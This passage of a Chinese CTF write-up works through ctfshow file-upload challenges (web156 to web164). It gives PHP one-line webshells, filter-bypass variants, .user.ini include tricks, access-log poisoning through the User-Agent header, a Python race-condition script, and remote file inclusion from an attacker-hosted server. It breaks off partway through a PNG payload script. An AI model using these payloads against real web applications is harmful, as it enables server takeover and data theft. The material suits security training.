style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{def31b54-</span><span style="color:#b5cea8">1032</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">4232</span><span style="color:#d4d4d4">-bd05-</span><span style="color:#b5cea8">914e67</span><span style="color:#d4d4d4">a276b9}</span></span></code></pre></div></div></figure><h3 id="web156中括号过滤大括号来绕过"><a class="markdownIt-Anchor" href="#web156中括号过滤大括号来绕过"></a> web156	(中括号过滤大括号来绕过)</h3><p>hint：后端不能单四校验</p><p>中括号 [] 检测，大括号绕过 {}</p><p>go.png：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'go'</span><span style="color:#d4d4d4">]);?&gt;</span></span></code></pre></div></div></figure><p>0.png：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">auto_prepend_file</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">go.png</span></span></code></pre></div></div></figure><p>这次发现短标签的一句话也被检测了，那么肯定不是 php 的锅了。这里查了一下才知道过滤的是 [ ] 这个符号。</p><p>但是这里同时在想是否可以换种一句话写法呢？</p><p><strong>参考 reference</strong>：<a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/101227210">一句话木马的变形技巧</a></p><p>这里就直接换一种木马写法吧（如编码方式隐藏），直接试试：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">base64_decode</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'JF9QT1NUWydnbydd'</span><span style="color:#d4d4d4">));?&gt;</span></span>
<span class="line"><span style="color:#6a9955">// 此处JF9QT1NUWydnbydd为$_POST['go']</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155859.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221105111140587"></p><p>可以看到上传成了。当然简单方法其实就是：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">{</span><span style="color:#ce9178">'go'</span><span style="color:#d4d4d4">});?&gt;</span></span></code></pre></div></div></figure><p>将中括号换成大括号即可。</p><p>回到主线，再上传.user.ini</p><p>尝试 getshell 拿到 flag 发现失败，报错如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155943.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221105113025504"></p><p>这是语法错误，说明这个短标签不能这么简单和编码隐藏写成这样，只能是形式，那么这里就不能这么绕过了。还是乖乖将中括号改为大括号吧。</p><p>修改后拿 flag:</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">go=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ../f*'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">ed57185-c99c-</span><span style="color:#b5cea8">46e9</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">93</span><span style="color:#d4d4d4">ce-f560bde1ef64}c=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ../f*'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><h3 id="web157新增分号过滤-php分号特性"><a class="markdownIt-Anchor" href="#web157新增分号过滤-php分号特性"></a> web157	(新增分号过滤 php 分号特性)</h3><p>hint：后端不能单五校验</p><p>新增分号；过滤</p><p>上传</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">{</span><span style="color:#ce9178">'go'</span><span style="color:#d4d4d4">});?&gt;</span></span></code></pre></div></div></figure><p>上传失败，不知道这次又过滤了什么，经过筛查不是？也不是 $ 什么的，那就可能是；号了，尝试删除之后重发发现确实是；号过滤。</p><p>这里有个知识点，就是 php 代码中，<strong>最后一行的 php 代码可以不带分号</strong></p><p>同时这里又过滤了 {}，导致一句话是写不了了。只能另寻他法：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">payload:&lt;?=</span><span style="color:#ce9178">`ls`</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>或者用 array_pop 函数：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">array_pop</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">))?&gt;</span></span></code></pre></div></div></figure><blockquote><p>array_pop(PHP4,PHP5,PHP7)</p><p>array_pop 弹出数组最后一个单元（出栈）</p></blockquote><p>同样使用.user.ini 进行包含，然后 post：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">a=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ls ../'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#6a9955">//a可以为任意字符或数字</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{843e3771-0db6-4b79-a745-f1dddb8bce47}</span></span></code></pre></div></div></figure><h3 id="web158分号特性"><a class="markdownIt-Anchor" href="#web158分号特性"></a> web158	(分号特性)</h3><p>hint: 后端不能单六校验</p><p>同上一题。</p><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{3ee0f3ba-dda7-4081-b609-f03d4ce8a4e6}</span></span></code></pre></div></div></figure><h3 id="web159左括号过滤-配合文件包含漏洞"><a class="markdownIt-Anchor" href="#web159左括号过滤-配合文件包含漏洞"></a> web159（左括号过滤 配合文件包含漏洞）</h3><p>新增过滤左括号 (	这个确实太致命了，确实不会。实测还过滤了 log</p><h4 id="这里就要配合文件包含漏洞一起了"><a class="markdownIt-Anchor" href="#这里就要配合文件包含漏洞一起了"></a> 这里就要配合文件包含漏洞一起了。</h4><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">payload:&lt;?=include</span><span style="color:#ce9178">'var/l'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'og/nginx/access.lo'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'g?'</span><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#6a9955">//    这里由于过滤了log，所以要用'.'来进行一个拼接。</span></span></code></pre></div></div></figure><p>想了解为什么可以搜 php 点的用法，这是 php 语法</p><p>上传试试：<br>go.png:</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=include</span><span style="color:#ce9178">'var/l'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'og/nginx/access.lo'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'g?'</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>want.png (修改后为.user.ini)：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">auto_prepend_file</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">go.png</span></span></code></pre></div></div></figure><p>这样一来，我们访问触发 index.php（其实上传就直接会触发 index.php，可以直接访问 upload 目录下），然后就会得到日志回显。</p><p>这个时候能看到日志文件中会显示访问端的浏览器信息也就是：User-Agent</p><p>于是我们直接返回访问 go.png，将对话 (go.png) 的包进行修改或者用 hackbar 添加 header：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">HEADER：</span></span>
<span class="line"><span style="color:#d4d4d4">Name：User-Agent</span></span>
<span class="line"><span style="color:#d4d4d4">Value：&lt;?php @</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);?&gt;</span></span>
<span class="line"><span style="color:#6a9955">// 由于这里是没有过滤的，可以随便写马</span></span></code></pre></div></div></figure><p>写入之后，我们回到 upload 目录下，进行 post 传：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ../f*'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>最后在日志回显最下面找到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{f0b380bd-41f3-4eeb-aac0-2d02ab329fd6}</span></span></code></pre></div></div></figure><h3 id="web160空格过滤抓包hex修改"><a class="markdownIt-Anchor" href="#web160空格过滤抓包hex修改"></a> web160	(空格过滤抓包 hex 修改)</h3><p>新增过滤空格。</p><p>构造 payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'/var/l'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'og/nginx/access.lo'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'g'</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>这里因为过滤空格，所以需要抓包进行修改 hex：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155896.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221106215310185"></p><p>这里官方视频是修改为 0d 也就是回车，亲测 0d 可行而换行的 0a 会真的换行：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155177.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221106215500384"></p><p>0d 替换之后并不会换行（亲测 0a 也可用只是会换行），而是类似于一个占位却不显示而且还不影响代码效果。</p><p>这里也可以修改成我这样 00</p><p>然后步骤同上题，得到 flag：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{c9e70901-3173-4ea1-bd8b-542b4bbe73e9}</span></span></code></pre></div></div></figure><h3 id="web161前后端文件头检测不一致迷惑行为"><a class="markdownIt-Anchor" href="#web161前后端文件头检测不一致迷惑行为"></a> web161	(前后端文件头检测不一致迷惑行为)</h3><p>尝试上传：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'/var/l'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'og/nginx/access.lo'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'g'</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>失败，提示文件类型不合规</p><p>可能这次真的要文件头了？尝试加上 png 文件头之后还是失败。尝试多次之后发现 gif 的文件头才能上传（？？？）</p><p>前端要求 png，后端检测 gif……</p><p>至此，我们上传带 gif 文件头的包含系统文件语句：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">GIF89a?</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'/var/l'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'og/nginx/access.lo'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'g'</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>这里记得 &lt;?=include 和 '/var' 之间的空格要修改 hex</p><p>最终上传成功，然后再上传.user.ini 文件去进行一个包含，成功得到日志回显，于是直接去 go.png 进行添头：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">User Agent: &lt;?php @</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);?&gt;</span></span></code></pre></div></div></figure><p>再到 upload 目录下 post：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ../f*'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{e1e9585d-2ba0-48f5-8d4d-47ca48b455e8}</span></span></code></pre></div></div></figure><h3 id="web162竞争远程文件包含"><a class="markdownIt-Anchor" href="#web162竞争远程文件包含"></a> web162（竞争 / 远程文件包含）</h3><p>尝试上传</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=include</span><span style="color:#ce9178">'/var/l'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'og/nginx/access.lo'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'g'</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>失败（空格也已修改 hex）。测试过滤了.</p><p>预期解是竞争，但是群主提供了一个别的思路。远程文件包含。</p><p>首先说预期解：</p><p>正常上传.user.ini</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">GIF89A</span></span>
<span class="line"><span style="color:#d4d4d4">auto_append_file=</span><span style="color:#ce9178">"go"</span></span></code></pre></div></div></figure><p>然后上传 go</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">GIF89A</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?=include"/tmp/sess"?&gt;</span></span></code></pre></div></div></figure><p>最后开始条件竞争</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> threading</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">session = requests.session()</span></span>
<span class="line"><span style="color:#d4d4d4">sess = </span><span style="color:#ce9178">'go'</span></span>
<span class="line"><span style="color:#d4d4d4">url1 = </span><span style="color:#ce9178">"http://8c7b68b0-202c-42f2-94a9-6a2cac90c89a.challenge.ctf.show/"</span></span>
<span class="line"><span style="color:#d4d4d4">url2 = </span><span style="color:#ce9178">"http://8c7b68b0-202c-42f2-94a9-6a2cac90c89a.challenge.ctf.show/upload"</span></span>
<span class="line"><span style="color:#d4d4d4">data1 = {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#ce9178">'PHP_SESSION_UPLOAD_PROGRESS'</span><span style="color:#d4d4d4">: </span><span style="color:#ce9178">'&lt;?php system("tac ../f*");?&gt;'</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">file = {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">: </span><span style="color:#ce9178">'go'</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">cookies = {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#ce9178">'PHPSESSID'</span><span style="color:#d4d4d4">: sess</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">def</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">write</span><span style="color:#d4d4d4">():</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">while</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">True</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">        r = session.post(url1, </span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">=data1, </span><span style="color:#9cdcfe">files</span><span style="color:#d4d4d4">=file, </span><span style="color:#9cdcfe">cookies</span><span style="color:#d4d4d4">=cookies)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">def</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">read</span><span style="color:#d4d4d4">():</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">while</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">True</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">        r = session.get(url2)</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> r.text:</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(r.text)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">threads = [threading.Thread(</span><span style="color:#9cdcfe">target</span><span style="color:#d4d4d4">=write),</span></span>
<span class="line"><span style="color:#d4d4d4">           threading.Thread(</span><span style="color:#9cdcfe">target</span><span style="color:#d4d4d4">=read)]</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> t </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> threads:</span></span>
<span class="line"><span style="color:#d4d4d4">    t.start()</span></span></code></pre></div></div></figure><p>由于平台并发限制，竞争很难出。所以下面写写非预期解：</p><p>首先正常上传配置文件.user.ini</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">GIF89A</span></span>
<span class="line"><span style="color:#d4d4d4">auto_append_file=</span><span style="color:#ce9178">"go"</span></span></code></pre></div></div></figure><p>然后包含一个远程的 url</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># 起服务：</span></span>
<span class="line"><span style="color:#d4d4d4">python3.8 -m http.server </span><span style="color:#b5cea8">8888</span></span></code></pre></div></div></figure><p>这个远程的 URL 要求是不能有点，可以用 ip 地址转换为长地址（长地址纯数字），直接访问这个远程 url 的效果需要是返回一个一句话。一般都是写成 txt</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=include</span><span style="color:#ce9178">'http://2018421144:8888/233'</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171354545.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230117135425431"></p><p>之后就直接访问 upload 目录 rce 即可。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171406920.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230117140624831"></p><h3 id="web163配置文件远程包含"><a class="markdownIt-Anchor" href="#web163配置文件远程包含"></a> web163（配置文件远程包含）</h3><p>不用竞争的话，可以尝试直接<strong>在配置文件中进行远程包含</strong>。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171423933.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230117142356848"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171425742.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230117142510659"></p><h3 id="web164png二次渲染"><a class="markdownIt-Anchor" href="#web164png二次渲染"></a> web164（png 二次渲染）</h3><p>png 二次渲染的脚本：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#9cdcfe">$p</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0xa3</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x9f</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x67</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xf7</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x0e</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x93</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x1b</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x23</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#b5cea8">0xbe</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x2c</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x8a</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xd0</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x80</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xf9</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xe1</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xae</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#b5cea8">0x22</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xf6</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xd9</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x43</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x5d</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xfb</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xae</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xcc</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#b5cea8">0x5a</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x01</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xdc</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x5a</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x01</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xdc</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xa3</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x9f</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#b5cea8">0x67</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xa5</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xbe</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x5f</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x76</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x74</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x5a</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x4c</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#b5cea8">0xa1</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x3f</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x7a</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xbf</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x30</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x6b</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x88</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x2d</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#b5cea8">0x60</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x65</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x7d</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x52</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x9d</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xad</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0x88</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0xa1</span><span style="color:#d4d4d4">,</span></span>
